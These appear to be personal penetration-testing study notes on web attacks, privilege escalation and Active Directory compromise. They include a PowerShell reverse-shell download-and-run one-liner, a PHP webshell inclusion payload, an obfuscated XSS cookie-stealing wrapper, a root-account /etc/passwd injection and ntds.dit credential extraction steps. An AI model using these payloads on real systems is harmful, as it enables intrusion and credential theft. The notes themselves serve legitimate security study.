# XSS
- <mark>Stored/Persistent</mark>:  payload is stored in a database or otherwise cached by a server. Usually exists in comment sections, product reviews, and etc.
	- For more complex XSS such as session/cookie stealing.
		- First, encode the payload to avoid bad characters using the following function:
		```bash
		function encode_to_javascript(string) {
		            var input = string
		            var output = '';
		            for(pos = 0; pos < input.length; pos++) {
		                output += input.charCodeAt(pos);
		                if(pos != (input.length - 1)) {
		                    output += ",";
		                }
		            }
		            return output;
		        }
		        
		let encoded = encode_to_javascript([JS Payload])
		console.log(encoded)
		```
		- Then, use the following format as the XSS payload.
		```bash
<script>
	eval(String.fromCharCode([Encoded JS Payload]))
</script>
	```
- <mark>Reflected</mark>: payload is included in a crafted request or link. Often occur in search fields and results, and anywhere user input is included in error messages.
- <mark>DOM-based</mark>: a new sub-class of reflected XSS attacks where the malicious data does not touch the web server. Rather, it is being reflected by the JavaScript code, fully on the client side.
# Diretory Traversal
- Used to access sensitive files on a web server and typically occurs when a web application is not sanitizing user input.
- Mostly used for <mark>gathering information</mark> but, sometimes.
	- If we can access certain files containing sensitive information, like passwords or keys, it may lead to system access.
- On Windows, instead of  `/etc/hosts`, we can use the file `C:\Windows\System32\drivers\etc\hosts` to test directory traversal vulnerabilities.
	- <mark>IMPORTANT</mark>: Windows uses backslash `\` instead of forward slash `/`.
- Since leveraging `../` is a known way to abuse web application behavior, it is often filtered by either the web server, web application firewalls, or the web application itself.
	- Use `%2e%2e/` to replace `../`.
# File Inclusion
- While <mark>directory traversal</mark> can be used to obtain the contents of a file outside of the web server's web root. <mark>File inclusion</mark> allows one to "include" a file in the application's running code, hence to execute local or remote files.
### Local File Inclusion (LFI)
-  <mark>Log Poisoning</mark>: Log Poisoning works by modifying data we send to a web application so that the logs contain executable code. In an LFI vulnerability scenario, the local file we include is executed if it contains executable content.
	- <mark>Apache Linux</mark>: 
		- `User-Agent` header is a good place to place poisoned code
		- `/var/log/apache2/access.log` is where the logs are located
	- <mark>XAMPP Windows</mark>: 
		- Apache logs can be found in `C:\xampp\apache\logs\access.log`.
- <mark>PHP Wrappers</mark>: can be used to bypass filters or obtain code execution via `File Inclusion` in PHP web applications.
	- <mark>php://filter</mark>: display the contents of files either with or without encodings like *ROT13* or *Base64*. Hence, allow one to display the contents of executable files such as `.php`, rather than executing them.
		- `e.g.`: `?page=php://filter/convert.base64-encode/resource=admin.php`
	- <mark>data://</mark>: used to embed data elements as plaintext or base64-encoded data in the running web application's code and offers an alternative method when we cannot poison a local file with PHP code.
		- `e.g.`: `?page=data://text/plain,<?php echo system($_GET["cmd"]);?>&cmd=ls`
		- <mark>IMPORTANT</mark>: Be aware to exploit it, the <mark>allow_url_include</mark> setting needs to be enabled.
### Remote File Inclusion (RFI)
-  In PHP web applications, the `allow_url_include` option needs to be enabled to leverage RFI.
	- allow us to include files from a remote system over `HTTP` or `SMB`.
# File Upload
```
When testing a file upload form, we should always determine what happens when a file is uploaded twice. 

1. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. 
2. If the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.
```
### Executable Files
- <mark>Bypassing Filters</mark>:
	- change the file extension to a less-commonly used PHP file extension such as `.phps` or `.php7` .
		- simple filters that only check for the most common file extensions, `.php` and `.phtml`.
	- changing characters in the file extension to upper case. 
		- The blacklist may be implemented by comparing the file extension of the uploaded file to a list of strings containing only lower-case PHP file extensions.
### Non-Executable Files
- <mark>Overwrite Configuration Files</mark>:
	-  e.g. SSH `authorized_keys`, would generally be a prime target
	- Check if the web application allows us to specify a relative path in the filename and overwrite a file via `Directory Traversal` outside of the web root.
	- We can do this by modifying the "filename" parameter in the request.
- <mark>Capturing Credentials</mark>: #windows #php
	- we can try to enter a non-existing file with a UNC path in the "filename" parameter like `\\192.168.119.2\share\nonexistent.txt`.
	- Use `responder` to capture the corresponding authentication attempt.
# Command Injection
- <mark>OS Command Injection</mark>:
	- Handy snippet that displays "CMD" or "PowerShell" depending on where it is executed.
```bash
		(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
# Client-Side Attack
- `Library-ms` file extension
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://[WebDAV_IP]</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
- PowerShell ShortCut Payload
```powershell
powershell.exe -nop -w hidden -c iex(iwr http://[IP]:[Port]/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [Port]
```
# AV Evasion
### AV Engines and Components
- File Engine
- Memory Engine
- Network Engine
- Disassembler
- Emulator/Sandbox
- Browser Plugin
- Machine Learning Engine
### Evasion Techniques
- <mark>On-Disk</mark>:
	- `packers`: originally designed to reduce the size of an executable. packers generate an executable that is not only smaller, but is also functionally equivalent with a completely new binary structure.
	- `Obfuscators`: replacing instructions with semantically equivalent ones, inserting irrelevant instructions or dead code, splitting or reordering functions, and so on.
	- `Crypter`: cryptographically alters executable code, adding a decryption stub that restores the original code upon execution.
		- foundational in modern malware as one of the most effective AV evasion techniques.
- <mark>In-Memory</mark>:
	- `Remote Process Memory Injection`: 
		- Inject the payload into another valid PE that is not malicious by leveraging a set of Windows APIs such as `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread`.
	- `Reflective DLL Injection`: 
		- Load a DLL stored by the attacker in the process memory.
		- Main challenge:
			- LoadLibrary does not support loading a DLL from memory. 
			- Windows operating system does not expose any APIs that can handle this either. So, attackers must write their own version of the API.
	- `Process Hollowing`: 
		- Launch a non-malicious process in a suspended state. Once launched, the image of the process is removed from memory and replaced with a malicious executable image. Finally, the process is then resumed and malicious code is executed instead of the legitimate process.
	- `Inline hooking`:
		- Involves modifying memory and introducing a hook into a function to make it point to our malicious code. 
		- Upon executing our malicious code, the flow will return back to the modified function and resume execution, appearing as if only the original code had executed.

# Net-NTLMv2 Relay
- https://en.hackndo.com/ntlm-relay/
- `impacket-ntlmrelayx`:
  ```bash
  # where `CMD` can be "powershell.exe -c iex(iwr http://[IP]:[Port]/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [Port]"
  impacket-ntlmrelayx --no-http-server -smb2support -t [target_IP] -c [CMD]
	```
# Port Forwarding/Tunneling
- <mark>Remote Dynamic Port Forward</mark>
	```bash
	ssh -v -N [USERNAME]@[TARGET] -R [SSH_SERVER_PORT] 
	```
- <mark>sshuttle</mark>
	-  <mark>Local Port Forward</mark>
	```bash
	# Specifying the SSH connection string we want to use, as well as the subnets that we want to tunnel through this connection.
	# Setting up local routes that force traffic through the SSH tunnel, hence no need for `proxychains` anymore.
	# `-D `allows `sshuttle` to run in the background.
	sshuttle -r -D [USERNAME]@[TARGET] [CIDR_Subnet] [CIDR_Subnet] 
	```
- <mark>plink.exe</mark> #windows 
	-  <mark>Local Port Forward</mark>
	```bash
	.\plink.exe -ssh -v -N [USERNAME]@[TARGET] -L [SSH_CLIENT_PORT]:[DESTINATION_SERVER]:[DESTINATION_PORT] 
	```
	- <mark>Remote Port Forward</mark>
	```bash
	.\plink.exe -ssh -v -N [USERNAME]@[TARGET] -R [SSH_SERVER_PORT]:[DESTINATION_SERVER]:[DESTINATION_PORT] 
	```
	- <mark>Dynamic Port Forward</mark>
	```bash
	#sets up your SSH connection as a SOCKS proxy.This can be beneficial if you're in a network that restricts your access to certain sites.
	.\plink.exe -ssh -v -N [USERNAME]@[TARGET] -D [SSH_CLIENT_PORT]
	#However, not all applications natively support routing their traffic through a SOCKS proxy. That's where tools like `proxychains` come into play.
	1. modify the `/etc/proxychains.conf`
	2. proxychains command_you_want_to_run
	```
- <mark>netsh</mark> #windows 
	- Native way that requires **administrative privileges** to create a port forward on Windows.
	```bash
	netsh interface portproxy add v4tov4 listenaddress=[LOCAL_IP] listenport=[LOCAL_PORT] connectaddress=[DESTINATION_SERVER] connectport=[DESTINATION_PORT]
	# Optionally, poke a hole in firewall if necessary.
	netsh advfirewall firewall add rule name="[Rule_Name]" protocol=TCP dir=in localip=[IP] localport=[PORT] action=allow
	```
 - <mark>chisel</mark> 
	 - https://github.com/jpillora/chisel
	- <mark>Local Port Forward</mark>
	```bash
	# Server
	chisel server --port [LOCAL_PORT] --reverse
	# Client
	chisel client [SERVER_IP]:[SERVER_PORT] [LOCAL_PORT]:[DESTINATION_SERVER]:[DESTINATION_PORT]
	```
	- <mark>Remote Port Forward</mark>
	```bash
    # Server
	chisel server --port [LOCAL_PORT] --reverse
	# Client
	chisel client [SERVER_IP]:[SERVER_PORT] R:[CHISEL_SERVER_PORT]:[DESTINATION_SERVER]:[DESTINATION_PORT]
	```
	- <mark>Local Dynamic Port Forward</mark>
	```bash
	# Server
	chisel server --port [LOCAL_PORT] --reverse --socks5
	# Client
	chisel client [SERVER_IP]:[SERVER_PORT] [CHISEL_CLIENT_PORT]:socks
	```
	- <mark>Remote Dynamic Port Forward</mark>
	```bash
	# Server
	chisel server --port [Local_Port] --reverse --socks5
	# Client
	chisel client [SERVER_IP]:[SERVER_PORT] R:[CHISEL_SERVER_PORT]:socks
	```
# Windows Privilege Escalation
### Situational Awareness
- Username and hostname
	```
	whoami /groups
	```
- Group memberships of the current user
- Existing users and groups
	```
	net user / Get-LocalUser
	net localgroup / Get-LocalGroup
	Get-LocalGroupMember [Group_Name]
	```
- Operating system, version and architecture
	```
	systeminfo
	```
- Network information
	```
	ipconfig /all
	route print
	netstat -ano
	```
- Installed applications
	- Remember to check `32-bit` and `64-bit` `Program Files` directories located in `C:\` along with the `Downloads` directory of the user.
	```powershell
	Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
	
	Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
	```
- Running processes
	```powershell
	Get-Process
	# More detailed output
	Get-CimInstance Win32_Process | Select-Object Name, ProcessId, ExecutablePath
	```
### Sensitive Information
```powershell
Get-ChildItem -File -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.ini,*.kdbx,*.pdf,*.xls,*.xlsx,*.doc,*.docx -Path [Path] 
```
- If we have `GUI` access, then use `runas /user:[USERNAME] cmd` to get a new command prompt under that user's security context.
### PowerShell Artifacts
```powershell
Get-History
# Clear-History does not clear the command history recorded by PSReadline
# Retrieve path of the history file from PSReadline
(Get-PSReadlineOption).HistorySavePath
```
### Service Binary Hijacking
- List Running Services
```powershell
# Needs GUI Access
Get-CimInstance win32_service | Select Name,StartName,PathName,State | Where-Object {$_.State -like 'Running'}
```
- Inspecting Binary Permissions
```powershell
Get-Acl [Binary_Path] | Select-Object -ExpandProperty Access | Select-Object FileSystemRights, AccessControlType, IdentityReference | Format-Table -AutoSize
```
- Inspecting Service Start Mode
```powershell
Get-CimInstance win32_service | Select Name, StartMode | Where-Object {$_.Name -like '[Service_Name]'}
```
### Service DLL Hijacking
- `DLL Overwrite`
- `DLL Search Order Hijack`
	- `Missing DLL` is considered a special case.
		- `Process Monitor` can be useful in identifying DLLs loaded and ones that are missing. 
		- However, `Process Monitor` requires Administration privilege, hence, the executable is usually transferred to the attacker machine to perform the above step.
	- <mark>Note</mark>: Below is the standard search order. However, when safe DLL search mode is disabled, the `current directory` is searched at position 2.
	1. The directory from which the application loaded.
	2. The system directory.
	3. The 16-bit system directory.
	4. The Windows directory. 
	5. The current directory.
	6. The directories that are listed in the PATH environment variable.
### Unquoted Service Paths
- If the provided string contains spaces and is not enclosed within quotation marks, it can be interpreted in various ways because it is unclear to the function where the file name ends and the arguments begin.
- When we have Write permissions to a service's main directory or subdirectories but cannot replace files within them.
```powershell
# CMD
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
# Powershell
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object { $_.PathName -and $_.PathName -notmatch '^C:\\Windows\\' -and $_.PathName -notmatch '\"' }
```
### Scheduled Tasks
- Review all properties of all scheduled tasks as list.
```powershell
schtasks /query /fo LIST /v
```
### Windows Privilege Abuse
- `SeImpersonatePrivilege`
- `SeBackupPrivilege`
- `SeAssignPrimaryToken`
- `SeLoadDriver`
- `SeDebug`
### PowerUp.ps1
```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force
```
# Linux Privilege Escalation
### Insecure File Permission
- Locate an executable file that not only allows us write access, but also runs at an elevated privilege level.
#### Abusing Cron Jobs
```shell
# List scheduled cron jobs: 
crontab -l #local 
ls -al /etc/cron* #system-wide
# Inspect the cron log file (`/var/log/cron.log`) for running cron jobs
grep "CRON" /var/log/syslog
```
#### Abusing Password Authentications
-  For backwards compatibility, if a password hash is present in the second column of an `/etc/passwd` user record, it is considered valid for authentication and takes precedence over the respective entry in `/etc/shadow`.
	- If we can write into `/etc/passwd`, we can effectively set an arbitrary password for any account.
	```shell
	openssl passwd [Password]
	echo "hacker:[Hash]:0:0:root:/root:/bin/bash" >> /etc/passwd
	```
### Insecure System Components
#### Setuid and Capabilities
- `Setuid`: When a user or a system-automated script launches a process, it inherits the UID/GID of its initiating script: this is known as the real UID/GID. On the other hand, effective UID/GID represents the actual value being checked when performing sensitive operations.
- `Capabilities`: extra attributes that can be applied to processes, binaries, and services to assign specific privileges normally reserved for administrative operations, such as traffic capturing or adding kernel modules.
	```shell
	/usr/sbin/getcap -r / 2>/dev/null
	```
#### Sudo Privileges
```shell
sudo -l
https://gtfobins.github.io/
```
#### Kernel Exploits
```shell
# Example
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```
# AD Enumeration
### Using Legacy Windows Tools
```shell
net user /domain
net user [USERNAME] /domain
net group /domain
net group [GROUPNAME] /domain
# Retrieve current account policies
net accounts
```
### Using PowerShell and .NET Classes
- LDAP is the protocol used to communicate with Active Directory.
- One needs a specific `LDAP ADsPath` in order to communicate with the AD service. 
	- ***Hostname*** can be a computer name, IP address or a domain name. Note that a domain may have multiple DCs. One should look for the DC that holds the most updated information, which is known as the `Primary Domain Controller (PDC)`.
		- Run following commands within `powershell` to locate PDC: `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
	- A ***Distinguished Name*** is a name that uniquely identifies an object in AD, including the domain itself.
		- e.g. `CN=Stephanie,CN=Users,DC=corp,DC=com
		-  Run following commands within `powershell` to find domain's DN: `([adsi]'').distinguishedName``
```
LDAP://HostName[:PortNumber][/DistinguishedName]
```
- Search Functionality:
	- Filter for users within the domain: `$dirsearcher.filter="samAccountType=805306368"`
```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host "-------------------------------"
}
```
### PowerView
- <mark>Basic Information</mark>
```shell
# Basic information about the domain
Get-NetDomain
# Domain Policies
Get-DomainPolicy
# Enumerate user objects
Get-NetUser
Get-NetUser [User_Name]
Get-NetUser | select cn,pwdlastset,lastlogon
# Enumerate group objects
Get-NetGroup
Get-NetGroup [Group_Name]
Get-NetGroup | select cn
# Enumerate computer objects
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
```
- <mark>Permissions & Logged on Users</mark>
	-  The command relies on the `OpenServiceW` function, which will connect to the _Service Control Manager_ (SCM) on the target machines. PowerView will attempt to open this database with the _SC_MANAGER_ALL_ACCESS_ access right, which require administrative privileges, and if the connection is successful, PowerView will deem that our current user has administrative privileges on the target machine.
	```shell
	# find local administrative access on computers under the current user context or specified otherwise.
	Find-LocalAdminAccess
	```
	- Uses the _NetWkstaUserEnum_ and _NetSessionEnum_  Windows APIs under the hood.
	- The permissions required to enumerate sessions with _NetSessionEnum_ are defined in the **SrvsvcSessionInfo** registry key at `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity`.
	```shell
	Get-NetSession -Verbose -ComputerName [Computer_Name] 
	```
- <mark>Service Principal Name</mark>
	```shell
	Get-NetUser -SPN | select samaccountname,serviceprincipalname
	```
- <mark>Object Permissions</mark>
	-  An object in AD may have a set of permissions applied to it with multiple Access Control Entries (ACE).These ACEs make up the Access Control List (ACL).
	1. GenericAll: Full permissions on object
	2. GenericWrite: Edit certain attributes on the object
	3. WriteOwner: Change ownership of the object
	4. WriteDACL: Edit ACE's applied to object
	5. AllExtendedRights: Change password, reset password, etc.
	6. ForceChangePassword: Password change for object
	7. Self (Self-Membership): Add ourselves to for example a group
	```shell
	Get-ObjectAcl -Identity stephanie
	Convert-SidToName [SID]
	Get-ObjectAcl -Identity "stephanie" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
	```
- <mark>Domain Shares</mark>
	- `SYSVOL` which resides on the domain controller itself. This particular share is typically used for various domain policies and scripts. 
	- By default, the `SYSVOL` share is mapped to `%SystemRoot%\SYSVOL\Sysvol\domain-name` on the domain controller and every domain user has access to it.
	```shell
	Find-DomainShare
	# Display shares only available to user's querying
	Find-DomainShare -CheckShareAccess
	```
# AD Authentication
### NTLM Authentication
- Used
	1. when a client authenticates to a server by **IP address** (instead of by hostname).
	2. If the user attempts to authenticate to a hostname that is **not registered** on the Active Directory-integrated DNS server. 
### Kerberos Authentication
- See my AD protocol notes or reading blog at https://en.hackndo.com/kerberos/.
### Cached AD Credentials
- All hail to `mimikatz`
# AD Authentication Attacks
### Password Attacks
- `Password Spraying`: `crackmapexec` or `Kerbrute`
### AS-REP Roasting
- Targeting `AS-REP` which Authentication Service Response.
- Without **Kerberos pre-authentication** in place, an attacker could send an `AS-REQ` to the domain controller on behalf of any AD user. After obtaining the `AS-REP` from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response.
### Kerberoasting
- Targeting `TGS-REP` which Ticket Granting Service Response.
- When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.
- The service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account.
### Silver Tickets
- Forging `TGS` Ticket without `KDC`.
- If we can obtained and cracked a `TGS-REP` hash to retrieve the plaintext password of an SPN. 
	- Without `Privileged Account Certificate (PAC)` validation enabled (optional step), One can take a step further and forge our own `TGS` tickets.
- In general, we need to collect the following three pieces of information to create a silver ticket:
	1. SPN password hash
	2. Domain SID: Multiple Ways but easiest would be simply run `whoami /user`
	3. Target SPN
- Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.
	- With this patch in place, the extended PAC structure field `PAC_REQUESTOR` needs to be validated by a domain controller.
### Domain Controller Synchronization
- The `Directory Replication Service(DRS)` Remote Protocol uses _replication_ to synchronize these redundant domain controllers.
- Domain controller receiving a request for an update does not check whether the request came from a known domain controller but only verifies that the associated `SID` has appropriate privileges.
# AD Lateral Movements
### WMI and WinRM
- To create a process on the remote target via WMI, we need the credentials of a member of the _Administrators_ local group.
- WMI communicates through `Remote Procedure Calls(RPC)` over port 135 for remote access and uses a higher-range port (19152-65535) for session data.
```shell
# CMD
wmic /node:"[IP]" /user:"[Username]" /password:"[Password]" process call create "powershell.exe -nop -w hidden -c ...."
# Powershell Common Interface Model(CIM)
Invoke-CimMethod -CimSession (New-CimSession -ComputerName [IP] -Credential (New-Object System.Management.Automation.PSCredential ('[Username]', (ConvertTo-SecureString '[Password]' -AsPlainText -Force))) -SessionOption (New-CimSessionOption -Protocol DCOM)) -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='[Command]'};
```
- `PowerShell Remoting`
```shell
New-PSSession -ComputerName [IP] -Credential (New-Object System.Management.Automation.PSCredential ('[Username]', (ConvertTo-SecureString '[Password]' -AsPlainText -Force)))\
# List active session
Get-PSSession
# Interact with chosen session
Enter-PSSession [Session_ID]
```
### psexec
- In order to misuse the tool for lateral movement, 4 requisites must be met.
	1. The user that authenticates to the target machine needs to be part of the `Administrators` local group.
	2. `ADMIN$` share must be available.
	3. Requires an `SMB` connection through the firewall.
	4. File and Printer Sharing has to be turned on.
### Pass the Hash
- `Impacket Suite`
- https://github.com/byt3bl33d3r/pth-toolkit
- Tools that are built to abuse `PtH` can be leveraged to start a Windows service (for example, cmd.exe or an instance of PowerShell) and communicate with it using `Named Pipes`. This is done using the `Service Control Manager API`.
- 4 requisites must be met.
	1. The user that authenticates to the target machine needs to be part of the `Administrators` local group.
	2. `ADMIN$` share must be available.
	3. Requires an `SMB` connection through the firewall.
	4. File and Printer Sharing has to be turned on.
### Overpass the Hash
- With overpass the hash, we can "over" abuse an `NTLM` user hash to gain a full Kerberos Ticket Granting Ticket (`TGT`). Then we can use the TGT to obtain a Ticket Granting Service (`TGS`).
### Pass the Ticket
- `All Hail to Mimikatz!`
### DCOM
- Interaction with `DCOM` is performed over `RPC` on TCP port 135 and local administrator access is required to call the `DCOM` Service Control Manager, which is essentially an `API`.
- https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
```shell
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","[IP]")).Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-nop -w hidden -c ...","7")
```
# AD Persistence
### Golden Ticket
- If we can get our hands on the `krbtgt` password hash, we could create our own self-made custom TGTs, also known as `golden tickets`.
### Shadow Copies
- A `Shadow Copy`, also known as `Volume Shadow Service(VSS)` is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes.
- As domain admins, we can abuse the `vshadow` utility to create a Shadow Copy that will allow us to extract the Active Directory Database `NTDS.dit` database file. Once we've obtained a copy of the database, we need the `SYSTEM hive`, and then we can extract every user credential offline.
```shell
# Retrieve `ntds.dit` database file.
vshadow.exe -nw -p  C:
# Rename to `ntds.dit.bak`.
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
# Retrieve `SYSTEM hive` from the Windows registry.
reg.exe save hklm\system c:\system.bak
# Parse the files locally by adding the `LOCAL` keyword.
impacket-secretsdump -ntds ntds.dit.bak -system 
system.bak LOCAL
```
